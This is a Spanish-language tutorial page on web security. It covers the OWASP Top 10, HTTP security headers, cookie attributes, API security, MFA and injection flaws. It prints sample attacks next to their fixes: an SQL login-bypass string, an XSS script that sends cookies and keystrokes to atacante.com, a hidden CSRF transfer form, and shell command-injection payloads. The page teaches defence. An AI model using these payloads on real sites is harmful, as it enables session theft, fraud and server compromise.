Seguridad Web y Aplicaciones

Protege tus aplicaciones web de las vulnerabilidades más comunes del OWASP Top 10.

OWASP Top 10 - Vulnerabilidades Web

SQL Injection

Inserción de código SQL malicioso en consultas para manipular la base de datos.

-- EJEMPLO VULNERABLE (NUNCA hacer esto): SELECT * FROM usuarios WHERE username = '$input' AND password = '$pass'; -- Ataque: El usuario ingresa: ' OR '1'='1' -- -- La consulta se convierte en: SELECT * FROM usuarios WHERE username = '' OR '1'='1' --' AND password = ''; -- Retorna TODOS los usuarios (bypass de autenticación)

✅ Prevención:

# ✅ Prepared Statements / Parameterized Queries import sqlite3 conn = sqlite3.connect('db.sqlite') cursor = conn.cursor() # NUNCA hacer esto: # cursor.execute(f"SELECT * FROM users WHERE id={user_id}") # ✅ SIEMPRE hacer esto: cursor.execute("SELECT * FROM users WHERE id=?", (user_id,)) user = cursor.fetchone()
Cross-Site Scripting (XSS)

Inyección de scripts maliciosos que se ejecutan en el navegador de otros usuarios.

Tipos de XSS:

Reflected XSS
El payload viene en la URL/parámetro y se refleja en la respuesta.
Stored XSS
El payload se almacena en BD y se muestra a otros usuarios. Más peligroso.
DOM-based XSS
El payload manipula el DOM directamente en el cliente.
// Payload de XSS común: <script> // Robar cookies fetch('https://atacante.com/steal?c=' + document.cookie); // Keylogger document.addEventListener('keypress', (e) => { fetch(`https://atacante.com/log?key=${e.key}`); }); </script> // ✅ Prevención: Sanitización + CSP // Nunca insertar innerHTML con input del usuario // Usar textContent o DOMPurify
Cross-Site Request Forgery

Fuerza al usuario autenticado a realizar acciones no deseadas en una aplicación.

<!-- Ataque CSRF: Formulario oculto --> <body onload="document.forms[0].submit()"> <form action="https://banco.com/transferir" method="POST"> <input type="hidden" name="cuenta_destino" value="ATACANTE123"/> <input type="hidden" name="monto" value="10000"/> </form> </body> <!-- ✅ Prevención: CSRF Token --> <form action="/transferir" method="POST"> <input type="hidden" name="_csrf" value="random_token_aqui"/> ... </form>
Fallos de Autenticación

Vulnerabilidades comunes:

  • Credential stuffing: Reutilización de credenciales filtradas
  • Brute force: Fuerza bruta sin rate limiting
  • Sesiones débiles: Tokens predecibles, sin expiración
  • MFA bypass: SIM swapping, phishing de MFA
Best Practices:
✅ Rate limiting en login (5 intentos → lockout)
✅ MFA obligatorio (TOTP > SMS)
✅ Contraseñas hasheadas con Argon2/bcrypt
✅ Sesiones con tokens JWT de corta duración + refresh tokens
✅ Headers de seguridad (CSP, X-Frame-Options)

Mejores Prácticas de Seguridad Web

Seguridad en Código
  • Validar y sanitizar todo input del usuario
  • Usar prepared statements para SQL
  • Implementar Content Security Policy (CSP)
  • Usar HTTPS en todas partes (HSTS)
  • No exponer información sensible en errores
Seguridad en Infraestructura
  • Actualizar dependencias regularmente
  • Configurar headers de seguridad
  • Implementar rate limiting
  • Usar WAF (Web Application Firewall)
  • Logging y monitoreo de acceso
# Headers de seguridad recomendados (Apache) Header always set X-Content-Type-Options "nosniff" Header always set X-Frame-Options "DENY" Header always set X-XSS-Protection "1; mode=block" Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains" Header always set Content-Security-Policy "default-src 'self'"

OWASP Top 10 - Vulnerabilidades que faltan

El OWASP Top 10 es el estándar de referencia para comprender los riesgos más críticos en aplicaciones web. Esta sección completa las vulnerabilidades ya vistas (SQL Injection, XSS, CSRF y fallos de autenticación) con los riesgos restantes de la lista, para que tengas una visión integral del panorama.

Broken Access Control / IDOR
Permite manipular identificadores (IDs) en URLs o peticiones para acceder a recursos ajenos, como ver documentos de otro usuario con solo cambiar el valor de un parámetro.
Security Misconfiguration
Configuraciones por defecto, cabeceras ausentes, directorios listables y errores verbosos que filtran información interna al atacante.
Insecure Design
Fallos en la fase de diseño: falta de controles de negocio, límites de uso o modelos de confianza que la aplicación asume sin verificar.
Vulnerable and Outdated Components
Dependencias y librerías con CVEs conocidos sin actualizar. Revisa tu inventario con SBOM y herramientas de escaneo de dependencias.
SSRF (Server-Side Request Forgery)
El servidor es forzado a realizar peticiones a recursos internos (metadata cloud, redes privadas) que no deberían ser accesibles desde Internet.
XXE (XML External Entity)
Entidades externas XML que permiten leer archivos locales, escanear puertos o lanzar ataques DoS al procesar documentos XML maliciosos.
Insecure Deserialization
Objetos serializados maliciosos que, al deserializarse, ejecutan código arbitrario en el servidor. Evita formatos nativos y valida la integridad de los datos.
Edición 2025: El OWASP Top 10 2025 incorpora los riesgos emergentes de la IA y los LLM, como la inyección de prompts, la exfiltración de datos por modelos y el abuso de agentes autónomos. Si construyes aplicaciones con IA, consulta además el OWASP LLM Top 10.

Encabezados de Seguridad HTTP

Los encabezados de respuesta HTTP indican al navegador cómo comportarse de forma segura. Configurarlos correctamente mitiga XSS, clickjacking, MIME sniffing, downgrade de HTTPS y otras amenazas, sin necesidad de modificar el código de la aplicación.

  • Content-Security-Policy (CSP): Restringe qué recursos (scripts, estilos, imágenes) puede cargar la página. Es la defensa principal contra XSS.
  • Strict-Transport-Security (HSTS): Obliga al navegador a usar solo HTTPS y evita ataques de downgrade y SSL stripping.
  • X-Frame-Options: Evita que la página sea incrustada en frames de terceros, bloqueando clickjacking.
  • X-Content-Type-Options: Fuerza la interpretación del tipo MIME declarado (nosniff) e impide el MIME sniffing.
  • Referrer-Policy: Controla cuánta información de la URL se envía al navegar hacia otros sitios.
  • Permissions-Policy: Limita el uso de APIs del navegador (cámara, geolocalización, micrófono) dentro de la página.
  • CORS: Define qué orígenes pueden acceder a los recursos de tu API; una configuración excesivamente permisiva expone datos a dominios maliciosos.
# Ejemplo de encabezados de seguridad en la respuesta HTTP Content-Security-Policy: default-src 'self'; script-src 'self' Strict-Transport-Security: max-age=31536000; includeSubDomains X-Frame-Options: DENY X-Content-Type-Options: nosniff

Cookies Seguras y Sesiones

Las cookies mantienen la sesión del usuario, pero si se configuran mal, un atacante puede robarlas, reutilizarlas o forzar acciones en nombre de la víctima. Cada atributo de seguridad cumple una función concreta contra un vector de ataque distinto.

HttpOnly
La cookie no es accesible desde JavaScript, lo que bloquea el robo de sesión mediante ataques XSS.
Secure
La cookie solo se envía por HTTPS, evitando que viaje en claro por HTTP y pueda ser interceptada en la red.
SameSite
Strict, Lax o None controla el envío de la cookie en peticiones entre sitios. Es un pilar en la defensa contra CSRF.
Session Fixation / Hijacking
El atacante impone (fixation) o roba (hijacking) el ID de sesión. Mitiga regenerando el ID tras el login y validando el origen de la petición.
Cookie Prefixes
Los prefijos __Host- y __Secure- obligan al navegador a aceptar la cookie solo bajo condiciones estrictas (HTTPS, dominio exacto).
Expiración y rotación de sesión
Sesiones con expiración corta y rotación periódica del ID reducen la ventana de tiempo en la que un token robado sigue siendo válido.
El riesgo de omitir un atributo: sin HttpOnly un XSS roba la cookie; sin Secure viaja en claro por HTTP; sin SameSite el navegador la envía en peticiones cruzadas (CSRF). Configúralas siempre: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict.

Seguridad de APIs

Las APIs exponen la lógica y los datos de tu aplicación a clientes y terceros, por lo que son un objetivo prioritario. Una API segura combina autenticación robusta, autorización por objeto y control de abuso.

OWASP API Top 10
Lista de riesgos específicos de APIs: broken object-level authorization, mass assignment, exceso de datos en respuestas y falta de rate limiting.
JWT (JSON Web Token)
Estructura header.payload.signature. Vigila los ataques de confusion de algoritmo (alg confusion) y valida siempre la expiración del token.
Rate Limiting
Limita el número de peticiones por usuario y ventana de tiempo; bloquea fuerza bruta, credential stuffing y ataques de lógica.
OAuth2 / OpenID Connect
Flujos de autorización y autenticación delegada con tokens de acceso, refresh tokens e ID tokens. Valida audience y expiración en cada uso.
API Keys y secretos
Nunca almacenes claves en el frontend ni en repositorios. Usa gestores de secretos y rota o revoca inmediatamente las claves comprometidas.
Validación de entradas
Valida y sanitiza todo lo que llegue a tus endpoints: tipos, rangos, formatos y valores permitidos, tanto en el cuerpo como en la URL.
# JWT decodificado: header.payload.signature (Base64Url) header = {"alg":"HS256","typ":"JWT"} payload = {"sub":"12345","name":"ana","iat":1710000000,"exp":1710003600} signature = HMACSHA256(base64url(header) + "." + base64url(payload), secreto) # sub = sujeto (usuario) | iat = emitido en | exp = expiración # Riesgos: no verificar "alg", secretos débiles, ignorar "exp" # ✅ Validar siempre firma, expiración y autorización por objeto

Autenticación y MFA

La autenticación verifica quién es el usuario antes de concederle acceso. El factor único (la contraseña) ya no es suficiente: el MFA combina varias pruebas de identidad y bloquea la gran mayoría de los ataques basados en credenciales robadas o adivinadas.

MFA
Algo que sabes (contraseña), algo que eres (biometría) y algo que tienes (token). Combina al menos dos factores independientes.
TOTP / HOTP
Códigos temporales basados en tiempo o en contador (p. ej. Google Authenticator). Más seguros que el SMS e inmunes al SIM swapping.
WebAuthn / Passkeys
Autenticación con claves de hardware o biométricas mediante criptografía de clave pública: sin contraseñas que robar ni phishing posible.
OAuth2 y SAML
Identidad federada: delegas la autenticación en proveedores de identidad (Google, Azure AD) y gestionas los accesos de forma centralizada.
Brute force protection
Bloqueo tras N intentos fallidos (lockout), retardos progresivos, CAPTCHA y rate limiting en el formulario de login.
Passwordless
Elimina las contraseñas usando magic links, passkeys o biometría. Menos superficie de ataque y una mejor experiencia de usuario.
¿Por qué MFA bloquea la mayoría de los ataques? La mayor parte de los incidentes relacionados con cuentas se deben a credenciales robadas, filtradas o reutilizadas (credential stuffing). Incluso si el atacante obtiene la contraseña, sin el segundo factor no puede completar el acceso: el MFA convierte una credencial comprometida en un dato inútil.

Inyección de Comandos y Otras Inyecciones

Más allá del SQL, los datos del usuario pueden acabar interpretados como comandos del sistema, consultas LDAP, plantillas, includes de servidor o encabezados HTTP. El principio es siempre el mismo: tratar los datos como datos y el código como código.

OS Command Injection
Ejecución de comandos del sistema operativo a través de inputs mal validados que terminan concatenados en una shell del servidor.
LDAP Injection
Manipulación de filtros LDAP para eludir la autenticación o enumerar el directorio (Active Directory) sin conocer credenciales.
Template Injection (SSTI)
Explotación de motores de plantillas (Jinja2, Twig, Freemarker) para ejecutar código arbitrario en el servidor.
SSI Injection
Inyección de directivas de Server-Side Includes (<!--#exec cmd-->) en páginas .shtml para ejecutar comandos del sistema.
CRLF Injection
Inserción de caracteres de retorno y salto de línea para inyectar encabezados HTTP arbitrarios, con cache poisoning o XSS como consecuencia.
# Payloads de inyección de comandos en inputs sin sanitizar: ; ls -la $(id) `id` || whoami # Cualquiera de ellos ejecuta comandos con los privilegios del servidor # ✅ Mitigación: validación estricta + allowlist de caracteres, # comandos y rutas; usar APIs seguras en lugar de shells
